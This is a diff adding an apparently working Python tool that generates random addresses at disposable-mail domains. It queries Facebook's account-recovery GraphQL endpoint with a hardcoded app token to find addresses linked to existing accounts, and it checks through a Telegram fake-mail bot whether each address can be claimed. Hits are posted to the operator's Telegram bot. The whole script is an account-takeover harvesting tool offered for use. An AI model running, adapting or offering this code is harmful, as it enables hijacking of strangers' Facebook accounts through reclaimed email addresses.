@@ -1,0 +1,229 @@
+# يحتاج: pip install telethon
+
+from threading import Thread
+from telethon.sync import TelegramClient
+import time
+import random
+import requests
+import os
+import requests
+import sys
+import json
+import random
+from asmix import Instagram
+
+god_fas = 0
+bad_fas = 0
+good = 0
+bad = 0
+
+P = '\x1b[1;97m'
+B = '\x1b[1;94m'
+O = '\x1b[1;96m'
+Z = "\033[1;30m"
+X = '\033[1;33m'  # اصفر
+F = '\033[2;32m'
+Z = '\033[1;31m'
+L = "\033[1;95m"  # ارجواني
+C = '\033[2;35m'  # وردي
+A = '\033[2;39m'  # ازرق
+P = "\x1b[38;5;231m"  # Putih
+J = "\x1b[38;5;208m"  # Jingga
+J1 = '\x1b[38;5;202m'
+J2 = '\x1b[38;5;203m'  # وردي
+J21 = '\x1b[38;5;204m'
+J22 = '\x1b[38;5;209m'
+F1 = '\x1b[38;5;76m'
+C1 = '\x1b[38;5;120m'
+P1 = '\x1b[38;5;150m'
+P2 = '\x1b[38;5;190m'
+F = '\033[2;32m'       # أخضر فاتح → True
+gg = '\x1b[38;5;208m'  # برتقالي → علامة ×
+X = '\033[1;33m'       # أصفر → False
+Z = '\033[1;31m'       # أحمر → False label
+A = '\033[2;39m'       # أزرق → Not
+
+
+def elia5():
+    sd = random.choice([J1, J2, J21, J22, F1, C1, P1, P2])
+    os.system('clear||cls')
+    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
+    print(sd + f"""
+   ███████╗  █████╗   ██████╗ ██████╗   ██████╗  ██╗  ██╗
+   ██╔════╝ ██╔══██╗ ██╔════╝ ██╔══██╗ ██╔═══██╗ ██║ ██╔╝
+   █████╗   ███████║ ██║      ██████╔╝ ██║   ██║ █████╔╝
+   ██╔══╝   ██╔══██║ ██║      ██╔══██╗ ██║   ██║ ██╔═██╗
+   ██║      ██║  ██║ ╚██████╗ ██████╔╝ ╚██████╔╝ ██║  ██╗
+   ╚═╝      ╚═╝  ╚═╝  ╚═════╝ ╚═════╝   ╚═════╝  ╚═╝  ╚═╝
+
+        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑬𝑳𝑰𝑨 ꧂ ]    {X}¸.•´¯`•.¸¸                       
+              {F}TLE : @p_8nf / @XRRHX
+    """)
+    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
+
+
+elia5()
+tok = input(' TOKEN : ')
+iid = input(' ID : ')
+API_ID  = input('API ID : ')
+API_HASH = input('API Hash : ')
+os.system('clear')
+def elia4(email):
+    global tok, iid
+    ff = F + f"""
+Facebook 
+━─────━[ Facebook  ]━─────━
+email = {email}                        
+━─────━[ Facebook  ]━─────━
+﴾ py - @p_8nf • @hhvvm1 • ﴿                                      
+    """
+    requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text={ff}')
+    print(ff)
+def pp(ff):
+    sys.stdout.write(f'''\r {F}{ff} \r''')
+    sys.stdout.flush()
+def inf(email):
+    global god_fas, bad_fas, good, bad
+    pp(email)
+    sys.stdout.write(
+        f'''\r{F}Hit:[{good}] {X}Not[{bad}] {gg} good Facebook [{god_fas}] {Z} Bad Facebook [{bad_fas}]  \r''')
+    sys.stdout.flush()
+
+
+def check(email):
+    global god_fas, bad_fas, good, bad
+    global API_HASH,API_ID
+    BOT = '@fakemailbot'
+    BAD_PHRASE = "This email address already taken by someone else."
+    GOOD_SUBSTR = "Your new fake mail id is"
+    client = TelegramClient('session', API_ID, API_HASH)
+    client.start()
+
+    sent_msg = client.send_message(BOT, email)
+    sent_id = getattr(sent_msg, 'id', None)
+
+    if not sent_id:
+        print("لم يتم الحصول على معرّف الرسالة المرسلة.")
+        client.disconnect()
+        return
+
+    timeout = 20
+    deadline = time.time() + timeout
+    found = False
+
+    while time.time() < deadline:
+        msgs = client.get_messages(BOT, limit=8)
+        for m in msgs:
+            if not getattr(m, 'out', False) and getattr(m, 'id', 0) > sent_id:
+                text = (m.text or "").strip()
+                if text == BAD_PHRASE:
+                    bad += 1
+                    inf(email)
+                elif GOOD_SUBSTR in text:
+                    good += 1
+                    elia4(email)
+                    inf(email)
+                else:
+                    print("unknown response:", text)
+                found = True
+                break
+        if found:
+            break
+        time.sleep(1)
+
+    if not found:
+        print(f" 🥷🏻 No bot response was received. ")
+
+    client.disconnect()
+
+
+def fas_elia(email):
+    global god_fas, bad_fas, good, bad
+    payload = {
+        'method': "post",
+        'pretty': "false",
+        'format': "json",
+        'server_timestamps': "true",
+        'locale': "en_EN",
+        'purpose': "fetch",
+        'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async",
+        'fb_api_caller_class': "graphservice",
+        'client_doc_id': "11994080425074657009809260413",
+        'fb_api_client_context': json.dumps({"is_background": False}),
+        'variables': json.dumps({
+            "params": {
+                "params": json.dumps({
+                    "params": json.dumps({
+                        "client_input_params": {
+                            "search_query": email,
+                        },
+                        "server_params": {}
+                    })
+                }),
+                "bloks_versioning_id": "c42a4bd8f99cb2bd57ea74ca2b690710be5a50faa60a68bb9bcc524fe6c63e7a",
+                "app_id": "com.bloks.www.caa.ar.search.async"
+            },
+        }),
+        'fb_api_analytics_tags': json.dumps(["GraphServices"]),
+        'client_trace_id': "4f97ba8c-8c40-4ac2-928f-5c88084a8a5c"
+    }
+    headers = {
+        'User-Agent': "[FBAN/FB4A;FBAV/536.1.0.58.77;FBBV/812349044;FBDM/{density=2.75,width=1080,height=2220};FBLC/en_EN;FBRV/815828157;FBCR/Unknown;FBMF/Unknown;FBBD/Unknown;FBPN/com.facebook.katana;FBDV/Unknown;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
+        'x-fb-friendly-name': "FbBloksActionRootQuery-com.bloks.www.caa.ar.search.async",
+        'authorization': "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+    }
+
+    response = requests.post(
+        "https://" + random.choice(
+            ["b-graph.facebook.com", "graph.facebook.com", "graph-fallback.facebook.com"]) + "/graphql",
+        data=payload, headers=headers).text.replace("/", "").replace("\\", "")
+
+    if any(msg in response for msg in [
+        "You can create a new account, or check your email address and try again.",
+        "Create new account"
+    ]):
+        bad_fas += 1
+        inf(email)
+
+    elif "obfuscated_id" in response:
+        check(email)
+        god_fas += 1
+        inf(email)
+
+    else:
+        pass
+
+
+def qcq():
+    memo = random.randint(100, 300)
+    O = f'\x1b[38;5;{memo}m'
+    elia5()
+    print(f"{Z}[{F}𝟏{Z}] {C1}𝒉𝒊2.𝒊𝒏 ")
+    print(f"{Z}[{F}𝟐{Z}] {C1}𝒕𝒆𝒍𝒆𝒈𝒎𝒂𝒊𝒍.𝒄𝒐𝒎 ")
+    aj = int(input(' Choose what you want  : '))
+    os.system('clear')
+
+    if aj == 1:
+        elia5()
+        ad = int(input('ضع هنا عدد حروف اليوزر :'))
+        while True:
+            u = "".join(random.choice('poiuytrewqlkjhgfdsamnbvcxz') for x in range(ad))
+            email = u + "@hi2.in"
+            fas_elia(email)
+
+    elif aj == 2:
+        elia5()
+        an = int(input('ضع هنا عدد حروف اليوزر :'))
+        while True:
+            u = "".join(random.choice('poiuytrewqlkjhgfdsamnbvcxz') for x in range(an))
+            email = u + "@telegmail.com"
+            fas_elia(email)
+
+    else:
+        print('bad choice')
+        qcq()
+
+
+
+if __name__ == "__main__":
+    qcq()
